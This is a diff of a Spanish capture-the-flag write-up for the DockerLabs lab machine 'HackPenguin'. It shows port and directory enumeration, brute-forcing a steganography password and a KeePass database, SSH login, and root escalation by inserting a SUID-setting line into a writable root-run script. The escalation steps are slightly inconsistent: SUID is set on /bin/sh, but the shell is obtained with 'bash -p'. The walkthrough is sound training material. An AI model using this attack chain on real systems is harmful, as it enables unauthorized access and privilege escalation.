@@ -1,57 +1,291 @@
-# HACKPENGUIN — DockerLabs
+# HackPenguin — DockerLabs
 
 **Plataforma:** DockerLabs  
-**Dificultad:** 🟠 Media  
+**Dificultad:** 🟡 Medio  
 **SO:** Linux  
+**Autor de la máquina:** El Pingüino de Mario  
+**Fecha de creación:** 09/04/2024  
+**Técnicas:** Gobuster · Steganography · Steghide · Keepass · JohnTheRipper · SSH · Writable Script · SUID abuse
 
 ---
 
-## Resumen
+## Índice
 
-Resolución de la máquina **HACKPENGUIN** de DockerLabs.
+1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
+2. [Enumeración web — Gobuster](#2-enumeración-web--gobuster)
+3. [Steganografía — extracción de Keepass](#3-steganografía--extracción-de-keepass)
+4. [Cracking Keepass y acceso SSH](#4-cracking-keepass-y-acceso-ssh)
+5. [Escalada de privilegios](#5-escalada-de-privilegios)
+6. [Lección aprendida](#6-lección-aprendida)
 
 ---
 
-## 1. Reconocimiento
+## 1. Despliegue y reconocimiento
 
-Vamos a desplegar la maquina vulnerable
+Desplegamos la máquina vulnerable:
 
-Haremos un escaneo profundo de los puertos abiertos de la maquina vulnerable.
+```bash
+sudo bash auto_deploy.sh hackpenguin.tar
+```
 
-## 2. Enumeración
+> IP asignada: `172.17.0.2`
 
-Ahora al ver el puerto 80, haremos una exploración con gobuster de directorios
-que no llegamos a ver.
+Realizamos un escaneo profundo:
 
-Nos encontramos con este, donde nos descargaremos la imagen para analizarla.
+```bash
+sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
+```
 
-## 3. Explotación
+Resultado:
 
-Utilizamos streghide, pero vemos que tiene una contraseña.
+```text
+22/tcp open ssh
+80/tcp open http
+```
 
-Lo pasamos por esta herramienta para hacer una fuerza bruta y ver si
-encontramos la contraseña.
+Servicios detectados:
 
-## 4. Post-explotación
+```text
+OpenSSH 8.9p1 Debian
+Apache2 Ubuntu Default Page
+```
 
-Ahora vemos que nos da una base de datos.
+---
 
-Con la herramienta de keepass2john vamos a intentar de igual manera hacer
-fuerza bruta y ver si encontramos la contraseña.
+## 2. Enumeración web — Gobuster
+
+Enumeramos directorios:
+
+```bash
+gobuster dir -u http://172.17.0.2 \
+-w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
+-x php,html,py,txt -t 100
+```
+
+Resultado:
+
+```text
+/index.html
+/penguin.html
+```
+
+Exploramos:
+
+```text
+http://172.17.0.2/penguin.html
+```
+
+La página contiene una imagen de un pingüino aparentemente normal.
+
+Descargamos la imagen:
+
+```bash
+wget http://172.17.0.2/penguin.jpg
+```
+
+Intentamos extraer contenido oculto:
+
+```bash
+steghide extract -sf penguin.jpg
+```
+
+Resultado:
+
+```text
+steghide: no pudo extraer ningún dato con ese salvoconducto
+```
+
+La imagen contiene datos ocultos protegidos mediante contraseña.
+
+---
+
+## 3. Steganografía — extracción de Keepass
+
+Utilizamos `StegCracker` para realizar fuerza bruta:
+
+```bash
+stegcracker penguin.jpg /usr/share/wordlists/rockyou.txt
+```
+
+Resultado:
+
+```text
+Successfully cracked file with password: chocolate
+```
+
+Extraemos el contenido oculto:
+
+```bash
+steghide extract -sf penguin.jpg
+```
+
+Contraseña:
+
+```text
+chocolate
+```
+
+Resultado:
+
+```text
+wrote extracted data to "penguin.kdbx"
+```
+
+Obtenemos una base de datos Keepass.
+
+Convertimos el hash utilizando `keepass2john`:
+
+```bash
+keepass2john penguin.kdbx > password.hash
+```
+
+Realizamos fuerza bruta con JohnTheRipper:
+
+```bash
+john password.hash
+```
+
+Resultado:
+
+```text
+qwerty
+```
+
+Abrimos la base de datos Keepass:
+
+```bash
+keepassxc penguin.kdbx
+```
+
+Contraseña:
+
+```text
+qwerty
+```
+
+Dentro encontramos credenciales SSH:
+
+```text
+Usuario: penguino
+Contraseña: pinguinomaravilloso123
+```
+
+---
+
+## 4. Cracking Keepass y acceso SSH
+
+Accedemos mediante SSH:
+
+```bash
+ssh penguino@172.17.0.2
+```
+
+Contraseña:
+
+```text
+pinguinomaravilloso123
+```
+
+Acceso correcto.
+
+Exploramos el directorio del usuario:
+
+```bash
+ls -la
+```
+
+Resultado relevante:
+
+```text
+script.sh
+archivo.txt
+```
+
+Observamos que el script pertenece a root y es modificable.
+
+Contenido original:
+
+```bash
+#!/bin/bash
+
+echo 'pinguino no hackeable' > archivo.txt
+```
+
+---
 
 ## 5. Escalada de privilegios
 
-Al encontrarla podemos meternos y ver las contraseñas que tenga guardadas.
+Editamos el script:
 
-Ingresamos en keepass
+```bash
+nano script.sh
+```
 
-## 6. Lección aprendida
+Añadimos:
 
-Esta máquina enseña a encadenar técnicas de reconocimiento, enumeración y explotación para comprometer un sistema Linux y escalar hasta root.
+```bash
+chmod u+s /bin/sh
+```
 
-> 💡 **Consejo para principiantes:** Si te atascas, vuelve al paso de enumeración — casi siempre hay algo que no viste la primera vez.
+El contenido final:
+
+```bash
+#!/bin/bash
+
+chmod u+s /bin/sh
+echo 'pinguino no hackeable' > archivo.txt
+```
+
+Esperamos a que root ejecute el script automáticamente.
+
+Verificamos permisos:
+
+```bash
+ls -la /bin/sh
+```
+
+Resultado:
+
+```text
+-rwsr-xr-x
+```
+
+Ejecutamos una shell preservando privilegios:
+
+```bash
+bash -p
+```
+
+Verificamos acceso:
+
+```bash
+whoami
+root
+```
+
+✅ Somos **root**.
 
 ---
 
-*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs*  
-*¿Te ha ayudado? Dale una ⭐ al [repositorio](https://github.com/Caan31/Maquinas_DockerLabs)*
+## 6. Lección aprendida
+
+| Vulnerabilidad | Impacto |
+|----------------|---------|
+| Steganografía con contraseña débil | Filtración de información |
+| Base de datos Keepass vulnerable | Descubrimiento de credenciales |
+| Contraseña SSH reutilizada | Acceso inicial |
+| Script editable ejecutado por root | Escalada de privilegios |
+| Activación del bit SUID | Acceso persistente root |
+
+**Para defenderse:**
+
+- Utilizar contraseñas robustas en steganografía y Keepass.
+- Restringir permisos sobre scripts ejecutados por root.
+- No reutilizar contraseñas entre servicios.
+- Auditar binarios SUID críticos.
+- Aplicar principio de mínimo privilegio.
+
+---
+
+*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
+*¿Te ha ayudado? Dale una ⭐ al repositorio.*
